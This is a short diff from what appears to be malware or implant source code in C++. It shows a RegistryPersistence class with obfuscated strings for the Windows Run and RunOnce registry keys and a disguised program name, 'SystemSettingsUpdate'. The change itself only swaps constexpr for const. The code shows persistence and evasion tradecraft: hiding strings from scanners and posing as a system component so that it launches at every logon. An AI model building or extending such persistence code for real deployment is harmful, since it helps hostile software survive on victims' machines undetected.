@@ -9,10 +9,10 @@
 #include <vector>
 
 // Obfuscated strings
-constexpr auto OBF_REGISTRY_PERSISTENCE = OBFUSCATE("RegistryPersistence");
-constexpr auto OBF_RUN_KEY = OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
-constexpr auto OBF_RUNONCE_KEY = OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
-constexpr auto OBF_APP_NAME = OBFUSCATE("SystemSettingsUpdate");
+const auto OBF_REGISTRY_PERSISTENCE = OBFUSCATE("RegistryPersistence");
+const auto OBF_RUN_KEY = OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+const auto OBF_RUNONCE_KEY = OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
+const auto OBF_APP_NAME = OBFUSCATE("SystemSettingsUpdate");
 
 RegistryPersistence::RegistryPersistence(Configuration* config)
     : BasePersistence(config)
